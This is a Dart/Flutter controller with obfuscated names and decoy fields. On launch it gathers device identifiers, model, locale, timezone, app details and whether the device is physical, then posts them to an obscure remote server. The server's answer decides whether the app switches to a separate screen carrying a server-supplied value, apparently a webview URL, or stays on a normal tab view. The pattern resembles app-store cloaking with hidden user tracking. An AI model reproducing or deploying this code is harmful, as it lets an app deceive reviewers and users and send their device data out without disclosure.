import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var imdnuwjbgt = RxBool(false);
  var xuijodt = RxBool(true);
  var ojpgmnzy = RxString("");
  var eldred = RxBool(false);
  var ebert = RxBool(true);
  final kprfwvq = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    qbjuazr();
  }


  Future<void> qbjuazr() async {

    eldred.value = true;
    ebert.value = true;
    xuijodt.value = false;

    kprfwvq.post("https://ra.kiurayu.online/wxbzrtpsliqanygemujfocvdkh",data: await bnlcwvaxt()).then((value) {
      var ngsq = value.data["ngsq"] as String;
      var ibmzdh = value.data["ibmzdh"] as bool;
      if (ibmzdh) {
        ojpgmnzy.value = ngsq;
        elvie();
      } else {
        macejkovic();
      }
    }).catchError((e) {
      xuijodt.value = true;
      ebert.value = true;
      eldred.value = false;
    });
  }

  Future<Map<String, dynamic>> bnlcwvaxt() async {
    final DeviceInfoPlugin abjt = DeviceInfoPlugin();
    PackageInfo ecko_vwlkse = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var zpjbma = Platform.localeName;
    var uvljtfhi = currentTimeZone;

    var rnba = ecko_vwlkse.packageName;
    var takbz = ecko_vwlkse.version;
    var jfix = ecko_vwlkse.buildNumber;

    var coia = ecko_vwlkse.appName;
    var joelleReynolds = "";
    var qbvtzln = "";
    var qghvztl = "";
    var wxdotm  = "";
    var katlynStiedemann = "";
    var elliotWill = "";
    var alethaNader = "";
    var karleyHane = "";
    var noeliaCormier = "";


    var injfrqw = "";
    var rkwzq = false;

    if (GetPlatform.isAndroid) {
      injfrqw = "android";
      var ytwdljkzve = await abjt.androidInfo;

      qbvtzln = ytwdljkzve.brand;

      qghvztl  = ytwdljkzve.model;
      wxdotm = ytwdljkzve.id;

      rkwzq = ytwdljkzve.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      injfrqw = "ios";
      var pijwyb = await abjt.iosInfo;
      qbvtzln = pijwyb.name;
      qghvztl = pijwyb.model;

      wxdotm = pijwyb.identifierForVendor ?? "";
      rkwzq  = pijwyb.isPhysicalDevice;
    }

    var res = {
      "takbz": takbz,
      "rnba": rnba,
      "joelleReynolds" : joelleReynolds,
      "qghvztl": qghvztl,
      "uvljtfhi": uvljtfhi,
      "wxdotm": wxdotm,
      "coia": coia,
      "katlynStiedemann" : katlynStiedemann,
      "zpjbma": zpjbma,
      "jfix": jfix,
      "injfrqw": injfrqw,
      "rkwzq": rkwzq,
      "noeliaCormier" : noeliaCormier,
      "qbvtzln": qbvtzln,
      "elliotWill" : elliotWill,
      "alethaNader" : alethaNader,
      "karleyHane" : karleyHane,

    };
    return res;
  }

  Future<void> macejkovic() async {
    Get.offAllNamed("/tab");
  }

  Future<void> elvie() async {
    Get.offAllNamed("/push");
  }

}
